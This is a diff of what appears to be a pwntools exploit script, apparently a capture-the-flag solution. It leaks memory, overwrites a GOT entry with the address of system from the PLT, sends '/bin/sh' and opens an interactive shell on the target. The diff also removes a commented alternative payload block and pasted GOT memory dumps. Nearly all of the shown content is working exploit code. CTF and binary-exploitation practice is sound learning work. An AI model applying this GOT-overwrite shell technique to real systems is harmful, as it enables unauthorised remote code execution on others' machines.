@@ -131,27 +131,11 @@ alloc()
 b=lit()
 b=b[1:65]
 dumpg(0,b)
-reference_libc='free'
+#reference_libc='atoi'
 #adr_reference_libc=bword(b[0:8])
 #shell=p64(tolibc('system'))
 shell=p64(elf.plt['system'])
 pause()
 ecrit(shell)
-'''
-alloc()
-ecrit("/bin/sh\x00")
-p.sendline("4")
-'''
 p.sendline("/bin/sh")
 p.interactive()
-'''
-0000000000000000 :  00007fa1b20533e0   00007fa1b203c460
-0000000000000010 :  00007fa1b20c80b0   00000000004006f6
-0000000000000020 :  00007fa1b2044000   00007fa1b200bdc0     
-0000000000000030 :  00007fa1b2020d90   00007fa1b209ca80     
-
-0x602018:	0x0000000000400710	0x00007fa1b203c460
-0x602028:	0x00007fa1b20c80b0	0x00000000004004f6
-0x602038:	0x00007fa1b2044000	0x00007fa1b200bdc0
-0x602048:	0x00007fa1b2020d90	0x00007fa1b209ca80
-'''
